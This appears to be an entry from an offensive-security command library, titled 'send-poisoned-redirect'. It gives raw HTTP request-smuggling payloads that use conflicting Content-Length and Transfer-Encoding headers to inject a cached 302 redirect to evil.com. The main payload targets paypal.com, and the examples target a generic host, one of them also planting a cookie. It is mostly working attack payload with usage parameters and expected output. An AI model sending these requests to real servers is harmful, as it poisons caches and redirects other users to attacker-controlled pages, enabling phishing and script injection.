---
data: |-
  POST /signin HTTP/1.1
  Host: paypal.com
  Content-Length: 5
  Transfer-Encoding: chunked

  0

  HTTP/1.1 302 Found
  Location: https://evil.com/xss
tags:
  - cache-poisoning
type: command
executor: http
platforms:
  - Web
id: 6bc20bbe-9556-4144-a542-56264d594cab
created_at: '2025-12-11T03:47:56.902Z'
updated_at: '2025-12-11T03:47:56.902Z'
verified: false
validated: true
submitted: true
---
# send-poisoned-redirect

## Command

```http
POST /signin HTTP/1.1
Host: paypal.com
Content-Length: 5
Transfer-Encoding: chunked

0

HTTP/1.1 302 Found
Location: https://evil.com/xss
```

## Description

Sends a smuggled response to inject a redirect into the cache, poisoning it for subsequent requests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Location` | Attacker-controlled URL for redirect | Yes |
| `Transfer-Encoding` | For chunked smuggling | Yes |

## Examples

### Basic Usage

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

0

HTTP/1.1 302 Found
Location: https://evil.com
```

### Advanced Usage

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 5
Transfer-Encoding: chunked

0

HTTP/1.1 302 Found
Location: https://evil.com/payload
Set-Cookie: poisoned=true
```

## Expected Output

Cache stores the redirect, causing future requests to follow it.

## Related

- [[commands/craft-smuggled-http-request]]
- [[procedures/Poison-Cache-with-Redirect]]
